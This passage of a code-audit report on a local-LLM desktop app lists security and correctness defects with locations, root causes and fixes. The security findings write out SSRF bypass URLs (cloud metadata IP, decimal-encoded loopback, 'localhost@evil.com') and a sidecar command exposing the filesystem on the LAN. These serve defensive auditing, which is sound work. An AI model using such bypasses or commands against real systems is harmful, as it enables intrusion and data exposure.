  non-empty host, and `port != 0` — nothing else. No loopback/private/link-local/metadata
  checks, no IP-literal handling, no DNS resolution. `http://169.254.169.254/`,
  `http://[::1]:8080`, and `http://2130706433/` (decimal-encoded 127.0.0.1) all pass. Its
  tests only cover `localhost@evil.com`, credentials, and `file://`.
- **Mitigating:** `llm.ollama_url` currently has no request-issuing consumer, so this is
  latent rather than live — but it is one feature away from being live.
- **Fix:** Reuse the correct implementation at `features/web/services/web.rs:944-1005`
  (IP-literal checks, pre-request DNS resolution validating **all** answers, IPv6
  ULA/link-local/multicast, AWS metadata v4+v6, post-redirect re-validation). Extract it
  into a shared module so there is one SSRF validator, not two.
- **Verify:** Add the bypass cases above as unit tests.

### SEC-8 — `shell:allow-execute` grants the sidecar with unrestricted argv
- **Severity:** P1 · **Verified:** READ
- **Location:** `src/app/src/capabilities/main.json:45`
- **Root cause:** The capability grants execution of `binaries/llama-server` with
  `"args": true` (any argv). The frontend never uses `Command.sidecar` — Rust spawns the
  sidecar itself with a hardened argv (`features/llm/engine/sidecar_manager.rs:865-868`,
  `--host 127.0.0.1`). The grant is unnecessary attack surface.
- **Exploit:** A renderer-side compromise spawns `llama-server --host 0.0.0.0 --path /` —
  an unauthenticated, LAN-exposed HTTP server over the filesystem.
- **Fix:** Remove the grant. If it is genuinely needed, replace `"args": true` with an
  `args` validator array pinning the permitted flags.
- **Verify:** App still starts and loads models with the grant removed.

### SEC-9 — Model downloads are unauthenticated in practice (checksums never supplied)
- **Severity:** P1 · **Verified:** READ
- **Location:** `features/download/manager.rs:466-468` (comparison);
  `features/llm/use_cases/download_model.rs:692-699` and `:626`;
  `features/download/saga.rs` (`checksum_sha256: None`);
  `domain/modules/curated_models.rs:299-354` (catalog entries carry no checksums)
- **Root cause:** The engine computes SHA-256 (`engine.rs:418-423`) and the manager compares
  it — but only when a checksum was supplied, which **never happens for any shipped model**.
  Size validation catches truncation only, and when `HEAD` returns no `Content-Length`,
  completion accepts any byte count > 0 (`engine.rs:427-455`).
- **Exploit:** TLS is the only integrity control. Any size-preserving corruption — or any
  corruption at all on a no-`Content-Length` response — is recorded as a completed, loadable
  model. Model files are then fed to a native inference runtime.
- **Fix:** Populate `checksum_sha256` from HuggingFace per-file metadata (HF publishes
  SHA-256) and from the curated catalog entries, and **fail closed**: refuse to mark a
  download complete without a verified checksum.
- **Verify:** Corrupt a byte in a downloaded file mid-flight; the download must fail.
- **Note:** App updates are notification-only (`features/updates/adapter.rs:157` returns the
  GitHub `html_url`; no updater plugin is present), so there is **no** artifact-signature
  gap there today. Revisit if in-app updates are ever implemented.

### SEC-10 — Export commands are an arbitrary-write / arbitrary-`mkdir` primitive
- **Severity:** P2 · **Verified:** READ
- **Location:** `src/app/src/src/features/backup/commands.rs:642` (also `:862`, `:1018`, `:1213`)
- **Root cause:** Export commands `create_dir_all` and write at any absolute path with only
  the `..` filter. `export_markdown_impl` is a stub that creates the directory and returns
  `0` — i.e. a pure arbitrary-`mkdir -p` primitive.
- **Fix:** Same confinement treatment as `SEC-3`. Either implement or remove the stub.

### SEC-11 — TOCTOU symlink window in validated file reads
- **Severity:** P2 · **Verified:** READ
- **Location:** `src/app/src/src/infrastructure/security/file_access_config.rs:118`;
  consumer at `features/file/use_cases/read_content.rs:70-75`
- **Root cause:** `validate_path` returns a path that the storage layer opens *later*,
  leaving a window in which the path can be replaced by a symlink out of the allowed root.
  An atomic `ValidatedFile::open` exists in the same module but is unused on this path.
- **Fix:** Use the atomic open helper (validate and open the same handle).

### SEC-12 — CSP allows `unsafe-eval`; devtools shipped in release
- **Severity:** P2 · **Verified:** READ
- **Location:** `src/app/src/tauri.conf.json:28` (CSP), `:24` (`devtools: true`),
  plus `freezePrototype: false`
- **Root cause:** `script-src` permits `'unsafe-eval'` and `style-src` permits
  `'unsafe-inline'`. The rest of the CSP is tight (`object-src 'none'`,
  `frame-ancestors 'none'`, no remote `connect-src`/`img-src`). `devtools: true` ships
  devtools in release builds, easing post-compromise exploration.
- **Fix:** Drop `unsafe-eval` if no dependency requires it (test thoroughly — some bundler
  and WASM paths do). Gate `devtools` on debug builds. Enable `freezePrototype`.

### SEC-13 — Doc-vs-code drift: `set_custom_endpoint` claims validation it does not perform
- **Severity:** P3 · **Verified:** READ
- **Location:** `src/app/src/src/features/credentials/use_cases/set_custom_endpoint.rs:9`
- **Root cause:** The doc comment says "Validates URL format before storage"; no validation
  occurs. Harmless today (the value is stored, not fetched), but it is the kind of comment
  that causes a future reviewer to skip adding a real check.
- **Fix:** Either validate (reuse the shared validator from `SEC-7`) or correct the comment.

---

## 5. Indexing, embedding, and search

This subsystem contains the highest concentration of P0 correctness bugs in the codebase.
`IDX-1` through `IDX-4` are all independently capable of silently breaking search.

### IDX-1 — Re-index upsert keeps the old row id but binds chunks to a new UUID → FK violation
- **Severity:** P0 · **Verified:** SQL-TESTED (confirmed against SQLite 3.51 by one audit;
  independently confirmed by reading by a second) + READ (I re-read the code paths myself)
- **Location:** `src/app/src/src/features/indexing/engine/storage/context.rs:116-140`
  (upsert) and `:146-155` (chunk insert); identical defect at
  `features/indexing/engine/storage/chunks.rs:38,74-121`; return-value bug at
  `infrastructure/persistence/repositories/.../documents.rs:229-257`
- **Root cause:** Each of the three entry points generates a **fresh** `doc_id`:
  ```rust
  let doc_id = Uuid::new_v4().to_string();          // context.rs:229 / :257 / :284
  insert_document_metadata(tx, &doc_id, path, mime_type).await?;
  insert_chunks_and_embeddings(tx, &doc_id, &chunks, &embeddings).await?;
  ```
  `insert_document_metadata` does `INSERT … ON CONFLICT(file_path) DO UPDATE SET …`. The
  `DO UPDATE` branch **does not update `id`** (correctly — it is the PK), so on a re-index the
  row retains its **original** id. But the caller keeps using the new UUID: the subsequent
  `DELETE FROM text_chunks WHERE document_id = <new uuid>` matches nothing (stale chunks
  survive), and the chunk `INSERT`s reference a `document_id` that does not exist. Foreign
  keys are enabled (`PRAGMA foreign_keys` at
  `infrastructure/persistence/database/connection.rs:64`), so the insert raises
  `FOREIGN KEY constraint failed` and the whole transaction rolls back.
- **Failure scenario:** User edits an already-indexed file. The watcher/actor path
  (`engine/actor.rs:243` `needs_reindex` → true → `:312`
  `store_document_with_context_and_file_tx`) fails with a foreign-key error **every time**.
  The document's stale chunks and embeddings remain in the index permanently, so search keeps
  returning the pre-edit content forever. Also reachable via `features/web/commands.rs:819`
  (`reindex_file`) and any web re-capture of an existing path.
- **Fix:** Make the upsert return the id that actually ended up in the row and use *that* for
  all child writes. With SQLite ≥ 3.35 the clean form is `RETURNING id`:
  ```sql
  INSERT INTO documents (...) VALUES (...)
  ON CONFLICT(file_path) DO UPDATE SET indexed_at = excluded.indexed_at, ...
  RETURNING id
  ```
  and have `insert_document_metadata` return `String`. **Because these are `sqlx::query!`
  macros and `SQLX_OFFLINE=true`, either regenerate the `.sqlx` cache or convert these call
  sites to the non-macro `sqlx::query_scalar::<_, String>(...)` form** (see ground rule 1).
  Fix all three entry points in `context.rs` plus `chunks.rs` plus the bogus return at
  `documents.rs:257` (which currently hands callers a UUID that was never inserted).
- **Verify:** Integration test — index a file, modify it, re-index, assert (a) success,
  (b) `documents` row count unchanged, (c) old chunks gone, (d) new chunks present and
  bound to the surviving document id.

### IDX-2 — Two writers use incompatible encodings for the same embedding BLOB column
- **Severity:** P0 · **Verified:** READ
- **Location:** `src/app/src/src/features/embedding/repository.rs:232` (bincode) vs.
  `features/indexing/engine/storage/context.rs:184-189` (raw LE f32 bytes); readers at
  `features/search/di.rs:91` and `features/embedding/repository.rs:332,375`
- **Root cause:** `text_embeddings.embedding` is written two different ways:
  - `EmbeddingRepository` writes `bincode::serialize(&Vec<f32>)` — which prefixes an 8-byte
    length header.
  - The indexing engine writes raw little-endian `f32` bytes with no header.

  Readers are equally split: the USearch rebuild decodes with raw `bytes_to_f32_vec`, while
  `repository.rs:332/375` decodes with `bincode::deserialize`. Each reader silently
  mis-handles the other writer's rows — a bincode row decodes as `dim + 2` floats under the
  raw decoder, and a raw row makes `bincode::deserialize` error out.
- **Failure scenario:** Two distinct failures from one root cause:
  1. On the one-time USearch rebuild (`di.rs:91`), every embedding written by
     `IndexFileUseCase` / `ReindexDocumentUseCase` decodes to the wrong length and is
     filtered out at `di.rs:95` — **those documents silently disappear from vector search**
     after a rebuild, with no error anywhere.
  2. `find_by_document_id` errors for any engine-written row, breaking that read path.
- **Fix:** Pick one encoding — raw LE f32 is preferable (compact, zero-copy, and what USearch
  wants) — and convert both writers and all readers to it. Then write a migration that
  detects and rewrites existing bincode rows: a bincode row is identifiable because its
  length is `dim*4 + 8` rather than `dim*4`. Add a single shared
  `encode_embedding`/`decode_embedding` pair in one module and make every call site use it,
  so this cannot drift again. **This is the same class of bug as the Repository Barrier rule
  in `CLAUDE.md` — two writers, one entity, no agreement.**
- **Verify:** Round-trip test through both former paths; migration test with a mixed table
  asserting all rows decode to `dim` floats afterward.

### IDX-3 — Renaming a document deletes all of its chunks (and cascades its embeddings)
- **Severity:** P0 · **Verified:** READ
- **Location:** `src/app/src/src/features/indexing/use_cases/rename_document.rs:151-173`;
  `domain/entities/document.rs:440` (`with_id`);
  `infrastructure/persistence/repositories/document_repository.rs:500`
  (`save_chunks_transactional`)
- **Root cause:** Rename reconstructs the aggregate with `Document::with_id`, which sets
  `chunks: Vec::new()`, then calls `save()`. `save_chunks_transactional` deletes **all**
  existing chunks for the document and inserts the (empty) set.
- **Failure scenario:** Either the rename wipes every chunk — FK-cascading the embeddings
  away and leaving a document that `from_parts` then refuses to load
  ("Document must have at least one chunk") — or, because the same-id `INSERT` conflicts on
  the `id` PK before reaching the `file_path` upsert target, it fails outright with
  `UNIQUE constraint failed: documents.id`. Both outcomes are broken; the user loses the
  document from search by renaming it.
- **Fix:** Rename should be a targeted metadata update (`UPDATE documents SET file_path = ?,
  file_name = ? WHERE id = ?`), not a full-aggregate save. Do not route metadata-only edits
  through a path that rewrites children. If the aggregate save must be used, load the real
  chunks first.
- **Verify:** Test: index a file, rename it, assert chunk and embedding counts are unchanged
  and search still returns it.

### IDX-4 — USearch rebuild hard-codes 384 dimensions, discarding all others
- **Severity:** P0 · **Verified:** READ (I read this one directly)
- **Location:** `src/app/src/src/features/search/di.rs:95`
- **Root cause:** The surrounding code goes to real trouble to resolve the active model's
  true dimension into a local `dimension` variable (`di.rs:56-58`, with a thoughtful comment
  about 384/768/1024 models), and then the rebuild filter ignores it:
  ```rust
  .filter(|(_, v, _, _, _)| v.len() == DEFAULT_EMBEDDING_DIM)   // 384, hard-coded
  ```
- **Failure scenario:** User runs any 768- or 1024-dimension embedding model (e.g. BGE-M3,
  mpnet). On rebuild, every stored embedding fails the filter, `enriched` is empty, and the
  rebuild silently produces an **empty vector index** — semantic search returns nothing, with
  only an absent log line as evidence.
- **Fix:** One-word change: `v.len() == dimension`. Then add a `tracing::warn!` when rows are
  dropped by this filter, with the expected and actual dimensions — a silent filter is what
  let this hide.
- **Verify:** Test rebuild with 768-dim rows and `active_embedding_dimension = Some(768)`;
  assert all rows are added.

### IDX-5 — Reindex never updates the in-memory vector index; staleness survives restarts
- **Severity:** P1 · **Verified:** READ
- **Location:** `src/app/src/src/features/indexing/use_cases/reindex_document.rs:189-215`
  (no `vector_search` dependency, unlike `IndexFileUseCase`); rebuild gate at
  `features/search/di.rs:78`
- **Root cause:** Reindex deletes DB embeddings and writes new chunks but never touches the
  shared in-memory USearch index. And because the persisted index is only rebuilt when it is
  **empty** (`di.rs:78`), the staleness is not repaired on restart either.
- **Failure scenario:** After reindexing a changed file, semantic search keeps returning
  vectors for deleted chunk ids (dangling results) and never surfaces the new content —
  permanently, across restarts.
- **Fix:** Inject the `VectorSearchPort` into the reindex use case and apply remove+add, the
  way `IndexFileUseCase` does. Consider a maintenance command that force-rebuilds the index.

### IDX-6 — One cancel permanently kills the indexing actor
- **Severity:** P1 · **Verified:** READ
- **Location:** `src/app/src/src/features/indexing/engine/actor.rs:155-159`;
  misleading error mapping at `:536`
- **Root cause:** `CancelAll` sets `cancelled = true` and **`break`s out of the receive
  loop**. The flag is never reset and the actor task exits, closing its channel.
- **Failure scenario:** User cancels an indexing run. Every subsequent `index_file` /
  `index_folder` for the rest of the process lifetime fails — reported as `QueueFull`, which
  sends any future debugger down the wrong path entirely.
- **Fix:** `CancelAll` should drain/abort in-flight work and reset `cancelled = false`,
  then **continue** the loop. Distinguish "actor dead" from "queue full" in the error mapping.
- **Verify:** Test: cancel, then index a file successfully in the same process.

### IDX-7 — Query cache is never invalidated by index/delete/reindex
- **Severity:** P1 · **Verified:** READ
- **Location:** `src/app/src/src/features/cache/query_cache.rs:169` (TTL 600 s);
  consumers `features/search/commands.rs:301,365`; only `clear()` callers are
  `features/cache/commands.rs:131,218`
- **Root cause:** The global `QUERY_CACHE` has a 10-minute TTL and no invalidation hook on
  corpus mutation.
- **Failure scenario:** User deletes a document, searches the same query again, gets the
  deleted document back and clicks a result that no longer exists. Symmetrically, newly
  indexed documents do not appear for up to 10 minutes for any repeated query.
- **Fix:** Invalidate (or bump a generation counter) on index / reindex / delete. A
  generation counter folded into the cache key is the least invasive option.

### IDX-8 — Vector deletion keys don't match rebuild keys, so deleted docs stay searchable
- **Severity:** P1 · **Verified:** READ
- **Location:** `src/app/src/src/features/indexing/use_cases/delete_document.rs:191-206`;
  key construction at `features/search/di.rs:80,90`; silent-miss at
  `infrastructure/search/usearch_index.rs:565`
- **Root cause:** Deletion removes keys of the form `emb_{chunk_id}`, but entries loaded by
  the startup rebuild are keyed by `te.id` — which, for engine-written rows, is a bare UUID
  (`context.rs:189`). `remove_embedding` returns `Ok` on a miss, so the mismatch is silent.
- **Failure scenario:** Deleting an engine-indexed document leaves its vectors in the
  persisted USearch index forever; deleted documents keep appearing in semantic search.
  Additionally, an error mid-loop (`:200`) aborts the remaining removals **after** the DB
  commit, leaving partial orphans.
- **Fix:** Use one canonical key scheme in a single helper shared by insert, rebuild, and
  delete. Make `remove_embedding` report misses (at least `warn`) instead of silently
  succeeding. Move removals before the commit or make them idempotently retryable.

### IDX-9 — Chunker mixes byte offsets and char offsets on non-ASCII text
- **Severity:** P1 · **Verified:** READ
- **Location:** `src/app/src/src/features/indexing/engine/chunker.rs:203-207`
  (vs. correct byte-offset slicing at `:125`)
- **Root cause:** `find_sentence_boundary` does `chars().nth(char_end - 1)` where `char_end`
  is a **byte** offset produced by the tokenizer (used correctly as a byte offset elsewhere in
  the same file).
- **Failure scenario:** Any document with accents, CJK, or emoji gets boundary detection that
  inspects the wrong character — arbitrary mid-sentence splits and missed boundaries, which
  degrades retrieval quality invisibly. Also `chars().nth()` makes this O(n²) per chunk on
  large documents.
- **Fix:** Work in byte offsets consistently (`text.as_bytes()[char_end - 1]` with a
  `is_char_boundary` guard, or `text[..char_end].chars().next_back()`). Add a test with CJK
  and emoji input.

### IDX-10 — Cancelled directory index reports "Complete / 100%"; concurrent jobs clobber state
- **Severity:** P1 · **Verified:** READ
- **Location:** `src/app/src/src/features/indexing/use_cases/index_directory.rs:120-124,155`;
  `features/indexing/engine/progress.rs:76-80`; shared-state reset at `index_directory.rs:98`
- **Root cause:** On cancellation the loop sets `error(...)` and then falls through to an
  **unconditional** `indexing_state.complete()`, which forces `status: Complete,
  percentage: 100`. Separately, a single shared `IndexingState` means a second concurrent
  job's `reset()` erases the first job's cancellation flag and progress totals.
- **Failure scenario:** User cancels a large folder index; the UI cheerfully reports
  "Complete — 100%" for a partial index. If two folder indexes overlap, the first one's
  cancellation silently stops working.
- **Fix:** Return early on cancellation without calling `complete()`; add a `Cancelled`
  terminal status distinct from `Complete`. Key progress state per job id instead of sharing
  one instance.

### IDX-11 — Release-mode OOB read in the AVX2 cosine-similarity path
- **Severity:** P1 · **Verified:** READ
- **Location:** `src/app/src/src/features/search/engine/vector_ops.rs:37-82,123`
- **Root cause:** Dimension equality is enforced only by `debug_assert_eq!`. In release
  builds the AVX2 path loads `b.as_ptr().add(offset)` for offsets derived from `a.len()`,
  reading out of bounds when `b` is shorter. The naive fallback path returns a graceful `0.0`
  for the same input.
- **Failure scenario:** Given that the database can hold mixed-dimension embeddings (see
  `IDX-2` and `IDX-4`), a release build comparing a 384-dim query against a 768-dim stored
  vector performs an out-of-bounds SIMD read — undefined behavior, potential segfault.
- **Fix:** Replace `debug_assert_eq!` with a real runtime check that returns `0.0` (or an
  error) on mismatch, in **both** paths. This is cheap relative to the dot product.
- **Verify:** Release-mode test with deliberately mismatched lengths.

### IDX-12 — Indexing rollback guard is a permanent no-op (wrong id domain)
- **Severity:** P2 · **Verified:** READ
- **Location:** `src/app/src/src/features/indexing/engine/transaction.rs:177`;
  id origin at `engine/actor.rs:206-217`
- **Root cause:** The RAII rollback runs `DELETE FROM documents WHERE id = ?` bound to
  `file_record.id` — a **`files`-table** id, never a `documents.id`. The delete matches zero
  rows, always. The `files` row itself is also not deleted.
- **Failure scenario:** Any indexing failure after `store_file` leaves an orphaned `files`
  row stuck at `is_indexed = 0`, contrary to the guard's documented purpose. Accumulates over
  time and can confuse "needs indexing" queries.
- **Fix:** Delete by `file_path` (or look up the document id), and delete the `files` row too.
  Add a test that asserts the guard actually cleans up.

### IDX-13 — Minor issues in the indexing path (batch)
- **Severity:** P3 · **Verified:** READ
- `features/indexing/use_cases/index_file.rs:279-280` — `validate_text_content` is called
  twice (harmless duplication; remove one).
- `index_file.rs:530-555` — the in-memory vector index is updated **before** the unit-of-work
  commit; a failed commit leaves ghost vectors until restart. Move it after the commit.
- `documents.checksum` has no `UNIQUE` constraint, so the pre-transaction duplicate check at
  `index_file.rs:253` is racy under concurrent imports of the same file — the loser fails with
  a constraint error instead of the intended "already_indexed" result.
- `features/vault/watcher.rs` — `is_disk_newer_than_sql` treats any non-RFC3339 `updated_at`
  as divergent, causing harmless re-imports on every focus when timestamps are stored in
  SQLite native format. Related to `SQL-11`.
- **Verified clean in this subsystem:** the extraction layer handles huge and non-UTF8 files
  properly (50 MB caps, `read_to_string` errors rather than panics), and sort directions and
  score thresholds in fusion, BM25, and USearch search are all correct.

---

## 6. Model download and management

### DL-1 — Pausing a download drives it to `Cancelled`; resume then permanently fails
- **Severity:** P0 · **Verified:** READ
- **Location:** `src/app/src/src/features/download/manager.rs:662-688` (`pause_download`),
  `:394-413` (task cancel branch); transition table at `domain/download.rs:77`;
  resume guard at `domain/download.rs:100-102`; destructive recovery at `manager.rs:769-772`
- **Root cause:** `pause_download` writes `Paused` to the DB, then fires the task's
  `cancel_tx` to stop the transfer. The task's cancel branch re-reads the session and calls
  `session.cancel()` — and `Paused → Cancelled` is a **permitted** transition — so the row
  ends up `Cancelled`, emitting a `Cancelled` event over the `Paused` one that was just sent.
  `resume_download` requires `Paused | Failed`, so it refuses. The only escape,
  `retry_download`, **deletes the partial file**.
- **Failure scenario:** User pauses a 4 GB model at 90%, then clicks resume → error. The only
  working button restarts the download from byte 0.
- **Fix:** The pause path must not reuse the cancel signal's terminal-transition logic. Give
  the task a distinct "pause" signal (or a flag on the cancel token) whose branch stops
  transferring, leaves the file intact, and does **not** transition state — the DB already
  says `Paused`. Add a state-machine test asserting `Paused` survives task teardown.
- **Verify:** Pause at ~50%, resume, assert the transfer continues from the existing offset
  and the file is never truncated.

### DL-2 — Paused downloads never release their concurrency slot; the queue stalls
- **Severity:** P0 · **Verified:** READ (found independently by two audits)
- **Location:** `src/app/src/src/features/download/manager.rs:413` (cancel branch `return`s
  before cleanup), `:546-551` (the cleanup that is skipped), `:662-688` (`pause_download`
  doesn't remove the entry either — contrast `cancel_download` at `:729`); gate at
  `manager.rs:190-201`
- **Root cause:** Two paths both fail to remove the session from `active_downloads`. The
  concurrency gate is `active.len() >= max_concurrent_downloads` (2).
- **Failure scenario:** User pauses two files of a multi-file model. `process_queue` now sees
  a permanently full slot table, so **every queued download and every new download silently
  never starts** until app restart. Resume writes "Resumed" to the DB and the UI, but no task
  is ever spawned — so the UI shows an active download that does not exist. The session's auth
  token also leaks (the cleanup at `:549` is skipped).
- **Fix:** Remove the entry from `active_downloads` on **every** task exit path — the cleanest
  form is a scope guard so no future `return` can skip it — and in `pause_download` itself.
- **Verify:** Pause 2, then start a third; assert it begins. Assert `active_downloads` is
  empty after pausing everything.

### DL-3 — Progress callback's read-modify-write races terminal transitions
- **Severity:** P1 · **Verified:** READ (found independently by two audits)
- **Location:** `src/app/src/src/features/download/manager.rs:302-318`;
  `download_repository.rs:290-323`; downstream at
  `features/download/startup_reconciliation.rs:16-63`
- **Root cause:** The progress callback **spawns a detached task per tick** that does
  `repository.get` → `session.update_progress` → `repository.update`, persisting the **full**
  session row including `state`. These tasks are unordered with respect to each other and to
  state transitions.
- **Failure scenario:** A progress task reads the session (state `Downloading`) just before
  the main task writes `Completed`; its `UPDATE` lands afterward and reverts the row to
  `Downloading` with stale byte counts. The session is now a zombie shown as
  forever-downloading. On next boot, `startup_reconciliation` marks it `Failed` even though
  the model actually completed and the saga already registered it — the session table and the
  models table now disagree. The same race applies to pause and cancel (compounding `DL-1`).
- **Fix:** Do not spawn per tick. Either (a) update progress through a dedicated
  column-scoped statement (`UPDATE download_sessions SET bytes_downloaded = ?, … WHERE id = ?
  AND state = 'downloading'`) that cannot clobber `state`, or (b) funnel progress through the
  single owning task with throttling. (a) is the smaller change and fixes it properly.
- **Verify:** Test that a progress write concurrent with a completion cannot leave the row in
  `Downloading`.

### DL-4 — File-completion matching breaks for filenames containing a subdirectory
- **Severity:** P1 · **Verified:** READ
- **Location:** `src/app/src/src/features/download/events/infra_events.rs:334-339`;
  `infrastructure/persistence/repositories/model_file/ops.rs:249-296`;
  name construction at `features/llm/use_cases/download_model.rs:206-252`
- **Root cause:** The event bridge derives the lookup key with
  `session.destination().file_name()` — a **basename** (`"model.onnx"`) — but
  `model_files.file_name` stores the curated/HF filename verbatim, which can include a
  subdirectory (`"onnx/model.onnx"`; the saga's own tests cover exactly this). The
  `UPDATE … WHERE file_name = ?` therefore affects 0 rows → `NotFound` → saga aborts.
- **Failure scenario:** A model whose manifest uses subdirectory-qualified filenames
  downloads every byte successfully but is **never marked complete** — it sits at `Pending`
  forever while the files sit on disk.
- **Fix:** Carry the manifest-relative filename through the download session (rather than
  re-deriving it from the destination path) and match on that. Add a test with an
  `onnx/model.onnx`-style entry through the full bridge.

### DL-5 — Disk-space check can consult the wrong volume
- **Severity:** P1 · **Verified:** READ
- **Location:** `src/app/src/src/features/download/engine.rs:112-149`
- **Root cause:** The loop returns on the **first** disk whose mount point is a prefix of the
  target path. On macOS, `/` is a prefix of everything, so the root volume can be evaluated
  for a path that actually lives on `/Volumes/External`.
- **Failure scenario:** Either a false pass (root has room, target volume does not → ENOSPC
  partway through a multi-gigabyte download) or a false fail (root is full, target volume is
  empty → download refused for no reason).
- **Fix:** Select the **longest** matching mount point, not the first.

### DL-6 — Crash recovery never resumes; it always restarts from byte 0
- **Severity:** P1 · **Verified:** READ
- **Location:** `src/app/src/src/features/download/manager.rs:353-369`
- **Root cause:** Progress is persisted at ≥500 ms intervals, so after a crash the on-disk
  partial file is almost always **larger** than the recorded `bytes_downloaded`. The code
  treats "file larger than expected" as corruption and passes `resume_from: None`, discarding
  a perfectly valid append-only HTTP prefix.
- **Failure scenario:** Every crash- or force-quit-interrupted multi-GB download restarts from
  scratch, which for a 4 GB model on a slow link is the difference between a minute and an
  hour.
- **Fix:** Trust the file length as the resume offset when it exceeds the recorded progress
  (the file is append-only), optionally truncating to the last known-good boundary. Reserve
  the "corrupt" branch for a file **smaller** than recorded progress or a size exceeding the
  advertised total. Note this interacts with `SEC-9`: with checksums enforced, trusting the
  on-disk prefix becomes safe because a bad resume is caught at completion.

### DL-7 — Half-purge migration leaves legacy ONNX embedding models "completed" but unloadable
- **Severity:** P1 · **Verified:** READ
- **Location:** `src/app/src/migrations/20260428000000_purge_legacy_onnx_embeddings.sql`;
  interacts with `migrations/20260501_unify_model_location.sql:24-33`;
  gate at `features/download/downloaded_model_repository.rs:703-721`
- **Root cause:** The migration deletes `.onnx` / `.onnx_data` **file** rows for all models
  but deletes `models` rows for only two hard-coded ids (`all-mpnet-base-v2`,
  `instructor-xl`). Any other legacy ONNX embedding download keeps a `status='completed'`
  models row plus surviving `config.json` / `tokenizer.json` file rows. The later
  `unify_model_location` migration then classifies it `local_dir` because `config.json`
  exists, and `is_downloaded()` returns true because all remaining file rows exist on disk —
  yet the Candle runtime finds no safetensors and cannot load it.
- **Failure scenario:** User upgrades. `has_any_embedding_model()` returns true, so first-run
  setup never offers a re-download, but every embedding attempt fails at load. Indexing is
  dead with no recovery path in the UI.
- **Fix:** Make the purge complete: delete the `models` rows for **any** model whose remaining
  file set contains no loadable weights, or mark them `status='needs_redownload'` and have
  `has_any_embedding_model` exclude that state. Add a migration test with a third legacy ONNX
  model id.

### DL-8 — Concurrent model loads can transiently double model RAM
- **Severity:** P2 · **Verified:** READ
- **Location:** `src/app/src/src/interfaces/di/container.rs:1088-1131` (`prewarm_active_models`)
  and `:761-790` (`get_or_load_llm`)
- **Root cause:** The double-checked cache deliberately permits concurrent loads (its comment
  says "last writer wins… wasteful but safe"). For sidecar-backed models each load spawns a
  full `llama-server` with the weights in RAM.
- **Failure scenario:** Boot prewarm races the user's first chat message → two `llama-server`
  processes each holding a multi-GB model until the loser's `SidecarHandle::Drop` kills it.
  On an 8 GB machine that transient 2× spike can OOM-kill. ("Safe" was assessed for
  correctness, not for memory.)
- **Fix:** Hold a per-role `tokio::sync::Mutex` (or a shared `OnceCell`/in-flight future map)
  so a second caller awaits the first load instead of starting its own.
- **Note:** Kill-on-drop itself is correctly implemented (`sidecar_manager.rs:189-207`).

### DL-9 — Fallback `model_files` row for a directory model reads as not-downloaded forever
- **Severity:** P2 · **Verified:** READ
- **Location:** `src/app/src/src/features/download/downloaded_model_repository.rs:266-317`;
  check at `:958`
- **Root cause:** The synthesized fallback row for a `LocalDirectory` model stores the
  **directory** as `file_path`, but `is_downloaded()` requires `path.is_file()`.
- **Failure scenario:** Any directory-located model saved without pre-created file rows reads
  as not-downloaded permanently, and its active selection is ignored. Currently only reachable
  via direct `save()` callers (the saga always pre-creates file rows), so it is a loaded trap
  rather than a live bug.
- **Fix:** Make `is_downloaded()` honor `ModelLocation` (directory → `is_dir()` plus a
  required-weights check).

### DL-10 — `download_model_files` silently keeps size-mismatched files
- **Severity:** P2 · **Verified:** READ
- **Location:** `src/app/src/src/features/download/engine.rs:800-810`
- **Root cause:** Treats a per-file size mismatch as a `warn` and keeps the file, directly
  contradicting its own doc comment ("Errors: ValidationFailed if size mismatch"), and
  hard-codes `auth_token: None`.
- **Failure scenario:** No production callers today (only the trait and a mock), but any
  future caller inherits silent truncation plus broken gated-repo downloads.
- **Fix:** Make it match its contract (error on mismatch) and thread the auth token, or delete
  it if it is genuinely unused.

### DL-11 — Update-check version comparison is wrong for part-count and pre-release
- **Severity:** P2 · **Verified:** READ
- **Location:** `src/app/src/src/features/updates/adapter.rs:88-111`
- **Root cause:** Hand-rolled comparison: `1.0.0` compares as newer than `1.0`, and
  `1.0.0-beta` parses to `[1,0]` so `1.0.0` looks like an available update.
- **Failure scenario:** Users on a pre-release build get a spurious "update available"
  notification indefinitely.
- **Fix:** Use the `semver` crate. The updates feature is check-only (returns the GitHub
  `html_url`), so this is cosmetic — but it is a 5-line fix.

### DL-12 — HF redirect handling trusts `Location` verbatim and re-sends the auth header
- **Severity:** P2 · **Verified:** READ
- **Location:** `src/app/src/src/features/download/engine.rs:545-549`
- **Root cause:** On a 302 carrying `x-linked-size`, the `Location` header is used verbatim as
  the next URL. A relative `Location` (RFC-legal) would be passed to `client.get()` and fail,
  and the auth header is then sent to whatever host `Location` names with no same-origin check.
- **Failure scenario:** Token disclosure to an unexpected host if HF's redirect target ever
  changes or is manipulated. (Sending the token to the HF CDN is expected; the absence of any
  check is the issue.)
- **Fix:** Resolve `Location` against the request URL, and only forward the `Authorization`
  header when the redirect target is on an allowlisted host.

**Verified clean in this subsystem:** the `ModelLocation` migration backfill arithmetic
(the `substr` config.json-stripping is correct, and the `__missing_after_migration__`
sentinel handling is sound); `first_run_setup.rs` (pure repository reads, no filesystem
walks — the Phase 3 fix held); boot prewarm's interaction with setup (fire-and-forget, only
loads already-completed active models); queue continuation on terminal events
(`infra_events.rs:276-283`); and the saga's transaction/rollback discipline. Multi-shard
safetensors chat entries were removed from the curated catalog, so there is no live
`index.json` parsing path to audit.

---

## 7. Chat, LLM, and retrieval

### CHAT-0 — Verification of the uncommitted `commands.rs` deletion: CLEAN
Not a defect — recorded because it was an explicit audit question. The working tree deletes
~500 lines from `features/conversation/commands.rs`, removing two commands
(`ask_with_conversation`, `stream_with_conversation`). Cross-checked in all four directions:
neither appears in `plugin.rs`'s `generate_handler!`, `build.rs`'s `InlinedPlugin::commands`,
`capabilities/main.json`, or any frontend `invoke()` / `COMMAND_DOMAIN_MAP` entry. The 42
remaining conversation commands match exactly across `plugin.rs:484-527`, `build.rs:55-100`,
and `capabilities/main.json:97-138`. **The deletion is safe to commit.** Only residue is
stale doc-comment references at `commands.rs:105`.

### CHAT-1 — Non-ASCII first message panics the chat command handler
- **Severity:** P0 · **Verified:** READ (I read this one directly)
- **Location:** `src/app/src/src/features/conversation/chat.rs:1259-1267`
- **Root cause:** ```rust
  if message.len() <= MAX_LEN { message.to_string() } else { format!("{}...", &message[..MAX_LEN]) }
  ```
  `len()` is bytes and `&message[..50]` slices at a **byte** index. The input validator
  (`input_validator.rs:49-63`) explicitly permits arbitrary Unicode. A `safe_truncate` helper
  already exists at `shared/modules/text_utils.rs:1-11` and is not used here.
- **Failure scenario:** `chat_with_conversation` with `conversationId: null` (a new
  conversation) and a message ≥50 bytes whose 50th byte is mid-character — e.g. 17 Chinese
